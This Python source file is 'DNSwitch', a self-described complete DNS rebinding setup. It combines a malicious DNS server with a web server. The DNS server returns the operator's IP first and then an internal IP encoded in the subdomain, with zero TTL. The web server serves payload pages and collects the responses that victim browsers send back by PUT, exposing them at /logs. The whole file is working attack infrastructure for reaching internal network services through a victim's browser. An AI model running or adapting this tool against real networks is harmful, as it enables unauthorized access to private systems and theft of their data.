#!/usr/bin/env python3

from nserver import NameServer, A, WildcardStringRule, NS
from http.server import BaseHTTPRequestHandler, HTTPServer
from multiprocessing import Process
from urllib.parse import urlparse
import os, argparse, logging
from datetime import datetime, timedelta
from threading import Thread
from time import sleep
from urllib.request import urlopen
import pkg_resources

class WebServer(BaseHTTPRequestHandler):

    def sendHTML(self, page):
        self.send_response_only(200, None)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        contents = pkg_resources.resource_stream('DNSwitchPages', page).read()
        self.wfile.write(contents)

    def do_GET(self):
        URL = urlparse(self.path)
        if (URL.path == '/gen'):
            self.sendHTML('generator.html')
        elif (URL.path == '/execute'):
            self.sendHTML('payload.html')
        elif (URL.path == '/logs'):
            self.send_response_only(200, None)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            if os.path.exists('requests.log'):
                with open('requests.log', 'rb') as f:
                    self.wfile.write(f.read())
        else:
            self.send_response_only(404, None)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h1>Not found</h1><!--not it-->')

    def do_OPTIONS(self):
       self.send_response_only(200, None)
       self.send_header('Access-Control-Allow-Origin', '*')
       self.send_header('Access-Control-Allow-Methods', 'PUT')
       self.end_headers()
       self.wfile.write(b'OK')

    def do_PUT(self):
       if 'Content-Length' in self.headers:
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        with open('requests.log', 'ab') as f:
            f.write('\n\n---- {} ----\n'.format(datetime.now().ctime()).encode('utf-8'))
            f.write(body)
        print('[\033[92m+\033[0m] Got response from {}'.format(self.address_string()))
       self.send_response_only(200, None)
       self.send_header('Access-Control-Allow-Origin', '*')
       self.end_headers()
       self.wfile.write(b'OK')

class DomainKeeper():
    def __init__(self, ip) -> None:
        self.burntDomains = []
        self.ip = ip
        Thread(target=self.check, daemon=True).start()
    
    def check(self):
        while True:
            try:
                self.burntDomains = [e for e in self.burntDomains if ( e[0] > ( datetime.now() - timedelta(minutes=1) ) ) ] 
            except Exception as e:
                print(e)
            sleep(10)

    def respond(self, query):
        name = query.name.lower()
        if (name not in [e[1] for e in self.burntDomains]):
            self.burntDomains.append((datetime.now(), name))
            return A(query.name, self.ip, ttl=0)
        else:
            try:
                return A(query.name, name.split('.')[0].replace('-', '.'), ttl=0)
            except:
                return A(query.name, self.ip, ttl=0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='DNSwitch',
        description='complete DNS rebinding setup',)
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-ip', '--ip')
    parser.add_argument('-dns-port', '--dns-port', type=int)
    parser.add_argument('-http-port', '--http-port', type=int)
    print("""\033[92m
 ____  _____ _____       _ _       _   
|    \|   | |   __|_ _ _|_| |_ ___| |_ 
|  |  | | | |__   | | | | |  _|  _|   |
|____/|_|___|_____|_____|_|_| |___|_|_|
        \033[0m""")
    args = parser.parse_args()
    webServerPort = 80 if args.http_port is None else int(args.http_port)
    nameServerPort = 53 if args.dns_port is None else int(args.dns_port)

    print('[*] Starting http server on port {} and DNS server on port {}'.format(webServerPort, nameServerPort))
    print('[\033[94mi\033[0m] Visit http://{}{}/gen to generate a payload URL'.format(args.domain, "" if webServerPort == 80 else ":" + str(webServerPort)))

    ns = NameServer('ns')

    ip = args.ip

    if ip is None:
        ip = urlopen('https://api.ipify.org').read().decode('utf-8')
        print('[\033[94mi\033[0m] Public IP not specified, auto fetched {}'.format(ip))

    dk = DomainKeeper(ip)

    ns.register_rule(
        WildcardStringRule(
            args.domain,
            ['A'],
            lambda query: A(query.name, ip),
            case_sensitive=False
        )
    )

    ns.register_rule(
        WildcardStringRule(
            '**.{}'.format(args.domain),
            ['A'],
            lambda query: dk.respond(query),
            case_sensitive=False
        )
    )

    ns.register_rule(
        WildcardStringRule(
            '**.{}'.format(args.domain),
            ['NS'],
            lambda query: NS(query.name, ip),
            case_sensitive=False
        )
    )

    ns.register_rule(
        WildcardStringRule(
            args.domain,
            ['NS'],
            lambda query: NS(query.name, ip),
            case_sensitive=False
        )
    )

    webServer = HTTPServer(('0.0.0.0', webServerPort), WebServer)
    Process(target=webServer.serve_forever, daemon=True).start()
    ns.settings.SERVER_PORT = nameServerPort
    ns.settings.SERVER_ADDRESS = '0.0.0.0'
    logging.disable()
    ns.run()